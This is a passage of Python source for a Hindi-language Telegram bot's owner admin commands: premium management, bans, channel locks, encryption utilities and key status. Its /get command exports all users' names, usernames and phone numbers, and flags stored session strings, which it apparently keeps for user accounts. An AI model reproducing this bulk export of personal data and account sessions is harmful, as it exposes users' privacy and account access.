            success, result = await add_premium_user(target_user_id, duration_value, duration_unit, plan_type)
            if success:
                expiry_ist = result + timedelta(hours=5, minutes=30)
                formatted_expiry = expiry_ist.strftime('%d-%b-%Y %I:%M:%S %p')
                await event.respond(f"✅ यूज़र {target_user_id} को {plan_type} सदस्य बनाया गया।\nवैधता: {formatted_expiry} (IST)")
                try:
                    await bot_client.send_message(target_user_id, f"✅ आपको {plan_type} सदस्यता दी गई है!\nवैधता: {formatted_expiry} (IST)")
                except Exception: pass
                if LOG_GROUP:
                    try:
                        await bot_client.send_message(
                            LOG_GROUP,
                            f"💎 **Premium Added**\n👤 User: `{target_user_id}`\n📦 Plan: `{plan_type}`\n⏳ Expire: `{formatted_expiry}`"
                        )
                    except Exception: pass
            else:
                await event.respond(f'❌ विफल: {result}')
        except Exception as e:
            await event.respond(f'त्रुटि: {str(e)}')

@app.on_message(filters.command("rem") & filters.private)
async def remove_premium_pyro_handler(client: Client, message: Message):
    user_id = message.from_user.id
    try: await message.delete()
    except Exception: pass

    if not check_is_owner(user_id):
        return await message.reply_text("❌ यह कमांड केवल ओनर के लिए है।")
    parts = message.text.strip().split()
    if len(parts) < 2:
        return await message.reply_text("👉 **सही फॉर्मेट:** `/rem [user_id]`")
    
    try:
        target_uid = int(parts[1])
        await remove_premium_user(target_uid)
        await message.reply_text(f"✅ यूज़र `{target_uid}` का प्रीमियम हटा दिया गया।")
        if LOG_GROUP:
            try:
                await client.send_message(LOG_GROUP, f"❌ **Premium Removed**\n👤 User: `{target_uid}`")
            except Exception: pass
    except Exception as e:
        await message.reply_text(f"त्रुटि: {e}")

if bot_client:
    @bot_client.on(events.NewMessage(pattern='/rem'))
    async def remove_premium_handler(event):
        if not await is_private_chat(event): return
        user_id = event.sender_id
        try: await event.delete()
        except Exception: pass

        if not check_is_owner(user_id):
            await event.respond('यह कमांड केवल ओनर के लिए है।')
            return
        parts = event.message.text.strip().split()
        if len(parts) < 2:
            return await event.respond("👉 **सही फॉर्मेट:** `/rem [user_id]`")
        
        try:
            target_uid = int(parts[1])
            await remove_premium_user(target_uid)
            await event.respond(f"✅ यूज़र `{target_uid}` का प्रीमियम हटा दिया गया।")
            if LOG_GROUP:
                try:
                    await bot_client.send_message(LOG_GROUP, f"❌ **Premium Removed**\n👤 User: `{target_uid}`")
                except Exception: pass
        except Exception as e:
            await event.respond(f"त्रुटि: {e}")

@app.on_message(filters.command("lock") & filters.private)
async def lock_channel_cmd(client: Client, message: Message):
    user_id = message.from_user.id
    try: await message.delete()
    except Exception: pass

    if not check_is_owner(user_id):
        return await message.reply_text("❌ केवल एडमिन के लिए।")
    parts = message.text.strip().split()
    if len(parts) < 2:
        return await message.reply_text("👉 उपयोग: `/lock [ChannelID या -100xxx]`")
    
    cid = parts[1].strip()
    chat_id = str(cid) if str(cid).startswith("-100") else f"-100{cid}"
    locked_db = db["locked_channels"]
    await locked_db.update_one({"chat_id": chat_id}, {"$set": {"chat_id": chat_id}}, upsert=True)
    await message.reply_text(f"🔒 चैनल `{chat_id}` सफलतापूर्वक लॉक कर दिया गया!")

@app.on_message(filters.command("unlock") & filters.private)
async def unlock_channel_cmd(client: Client, message: Message):
    user_id = message.from_user.id
    try: await message.delete()
    except Exception: pass

    if not check_is_owner(user_id):
        return await message.reply_text("❌ केवल एडमिन के लिए।")
    parts = message.text.strip().split()
    if len(parts) < 2:
        return await message.reply_text("👉 उपयोग: `/unlock [ChannelID या -100xxx]`")
    
    cid = parts[1].strip()
    chat_id = str(cid) if str(cid).startswith("-100") else f"-100{cid}"
    locked_db = db["locked_channels"]
    await locked_db.delete_one({"chat_id": chat_id})
    await message.reply_text(f"🔓 चैनल `{chat_id}` सफलतापूर्वक अनलॉक कर दिया गया!")

@app.on_message(filters.command("ban") & filters.private)
async def ban_cmd(client: Client, message: Message):
    user_id = message.from_user.id
    try: await message.delete()
    except Exception: pass

    if not check_is_owner(user_id): return
    parts = message.text.strip().split()
    if len(parts) < 2: return await message.reply_text("👉 उपयोग: `/ban [user_id]`")
    try:
        t_id = int(parts[1])
        await ban_user(t_id)
        await message.reply_text(f"🚫 यूज़र `{t_id}` को बैन कर दिया गया है।")
    except Exception as e:
        await message.reply_text(f"त्रुटि: {e}")

@app.on_message(filters.command("unban") & filters.private)
async def unban_cmd(client: Client, message: Message):
    user_id = message.from_user.id
    try: await message.delete()
    except Exception: pass

    if not check_is_owner(user_id): return
    parts = message.text.strip().split()
    if len(parts) < 2: return await message.reply_text("👉 उपयोग: `/unban [user_id]`")
    try:
        t_id = int(parts[1])
        await unban_user(t_id)
        await message.reply_text(f"✅ यूज़र `{t_id}` को अनबैन कर दिया गया है।")
    except Exception as e:
        await message.reply_text(f"त्रुटि: {e}")

@app.on_message(filters.command("get") & filters.private)
async def get_all_users_dump(client: Client, message: Message):
    user_id = message.from_user.id
    try: await message.delete()
    except Exception: pass

    if not check_is_owner(user_id): return
    
    status_msg = await message.reply_text("🔄 डेटा एकत्र किया जा रहा है...")
    try:
        users = await users_collection.find({}).to_list(length=10000)
        prem_users = await premium_users_collection.find({}).to_list(length=10000)
        
        dump_text = (
            f"=== ANANOMUS BRO BOT USERS EXPORT ===\n"
            f"Total Registered Users: {len(users)}\n"
            f"Total Premium Users   : {len(prem_users)}\n"
            f"Export Date           : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"=====================================\n\n"
        )
        for u in users:
            uid = u.get("user_id")
            phone = u.get("phone", "N/A")
            name = f"{u.get('first_name', '')} {u.get('last_name', '')}".strip()
            username = u.get("username", "None")
            sess = "Yes" if u.get("session_string") else "No"
            dump_text += f"UID: {uid} | Name: {name} | User: @{username} | Phone: {phone} | Session: {sess}\n"

        file_name = f"users_dump_{int(time.time())}.txt"
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(dump_text)

        await status_msg.delete()
        await client.send_document(
            message.chat.id,
            file_name,
            caption=f"📊 **कुल यूज़र्स:** `{len(users)}` | **प्रीमियम:** `{len(prem_users)}`"
        )
        if os.path.exists(file_name):
            os.remove(file_name)
    except Exception as e:
        await status_msg.edit(f"❌ त्रुटि: {e}")

@app.on_message(filters.command("encrypt") & filters.private)
async def encrypt_cmd(client: Client, message: Message):
    try: await message.delete()
    except Exception: pass
    user_id = message.from_user.id
    if not check_is_owner(user_id): return
    
    parts = message.text.strip().split(maxsplit=1)
    if len(parts) < 2:
        return await message.reply_text("👉 **उपयोग:** `/encrypt [टेक्स्ट_स्ट्रिंग]`")
    raw_str = parts[1].strip()
    try:
        from utils.encrypt import ecs
        encrypted = ecs(raw_str)
        await message.reply_text(
            f"🔐 **एन्क्रिप्टेड स्ट्रिंग (AES-GCM):**\n\n`{encrypted}`"
        )
    except Exception as e:
        await message.reply_text(f"❌ एन्क्रिप्शन त्रुटि: `{e}`")

@app.on_message(filters.command("decrypt") & filters.private)
async def decrypt_cmd(client: Client, message: Message):
    try: await message.delete()
    except Exception: pass
    user_id = message.from_user.id
    if not check_is_owner(user_id): return
    
    parts = message.text.strip().split(maxsplit=1)
    if len(parts) < 2:
        return await message.reply_text("👉 **उपयोग:** `/decrypt [एन्क्रिप्टेड_स्ट्रिंग]`")
    enc_str = parts[1].strip()
    try:
        from utils.encrypt import dcs
        decrypted = dcs(enc_str)
        await message.reply_text(
            f"🔓 **डिक्रिप्टेड परिणाम:**\n\n`{decrypted}`"
        )
    except Exception as e:
        await message.reply_text(f"❌ डिक्रिप्शन त्रुटि: `{e}`")

@app.on_message(filters.command(["keyinfo", "keys"]) & filters.private)
async def keyinfo_cmd(client: Client, message: Message):
    try: await message.delete()
    except Exception: pass
    user_id = message.from_user.id
    if not check_is_owner(user_id): return
    
    from config import MASTER_KEY, IV_KEY
    m_mask = MASTER_KEY[:4] + "****" + MASTER_KEY[-4:] if len(MASTER_KEY) > 8 else "****"
    i_mask = IV_KEY[:4] + "****" + IV_KEY[-4:] if len(IV_KEY) > 8 else "****"
    
    text = (
        "🔐 **सिस्टम एन्क्रिप्शन कुंजियाँ (Encryption Engine Status)**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🗝️ **Master Key (Derived):** `{m_mask}` (Status: Loaded)\n"
        f"🗝️ **Salt / IV Key:** `{i_mask}` (Status: Loaded)\n"
        f"⚙️ **एल्गोरिदम:** AES-256-GCM + PBKDF2HMAC (SHA256)\n"
        f"⚡ **सुरक्षा स्तर:** Military Grade End-to-End Database Encryption"
    )
    await message.reply_text(text)
